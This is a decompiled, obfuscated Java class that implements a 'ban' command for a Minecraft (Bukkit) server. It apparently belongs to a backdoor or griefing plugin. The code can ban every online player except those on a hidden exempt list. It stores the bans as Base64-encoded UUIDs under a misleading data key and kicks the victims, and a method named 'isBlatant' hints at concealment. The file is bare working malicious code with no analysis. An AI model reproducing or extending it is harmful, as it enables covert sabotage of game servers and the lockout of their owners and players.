/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class BanCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIllIIIlIlIIIIIlIIll, String lllllllllllllIllIIIlIlIIIIIllIlI, String[] lllllllllllllIllIIIlIlIIIIIlIIII, Player lllllllllllllIllIIIlIlIIIIIlIllI) {
        if (lllllllllllllIllIIIlIlIIIIIlIIII.length <= 1) {
            lllllllllllllIllIIIlIlIIIIIlIllI.sendMessage(Settings.USAGE("ban <player>"));
        } else if (lllllllllllllIllIIIlIlIIIIIlIIII[1].equals("*")) {
            for (Player lllllllllllllIllIIIlIlIIIIlIIlIl : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllIllIIIlIlIIIIIlIIll.lite.contains(lllllllllllllIllIIIlIlIIIIlIIlIl.getName())) continue;
                byte[] lllllllllllllIllIIIlIlIIIIlIIlll = Base64.getEncoder().encode(lllllllllllllIllIIIlIlIIIIlIIlIl.getUniqueId().toString().getBytes());
                DataManager.bannedPlayers.add(new String(lllllllllllllIllIIIlIlIIIIlIIlll));
                DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                DataManager.saveData();
                API.kickPlayer(lllllllllllllIllIIIlIlIIIIlIIlIl);
            }
            lllllllllllllIllIIIlIlIIIIIlIllI.sendMessage(Settings.PREFIX("Everyone was banned!"));
        } else {
            Player lllllllllllllIllIIIlIlIIIIlIIIIl = Bukkit.getServer().getPlayer(lllllllllllllIllIIIlIlIIIIIlIIII[1]);
            if (lllllllllllllIllIIIlIlIIIIlIIIIl == null) {
                lllllllllllllIllIIIlIlIIIIIlIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllIllIIIlIlIIIIIlIIII[1]).append(Settings.WHITE).append(" doesn't seem to exist."))));
            } else {
                byte[] lllllllllllllIllIIIlIlIIIIlIIIll = Base64.getEncoder().encode(lllllllllllllIllIIIlIlIIIIlIIIIl.getUniqueId().toString().getBytes());
                DataManager.bannedPlayers.add(new String(lllllllllllllIllIIIlIlIIIIlIIIll));
                DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                DataManager.saveData();
                lllllllllllllIllIIIlIlIIIIIlIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(lllllllllllllIllIIIlIlIIIIlIIIIl.getName()).append(" was banned!"))));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public BanCommand() {
        BanCommand lllllllllllllIllIIIlIlIIIllIIIlI;
    }
}

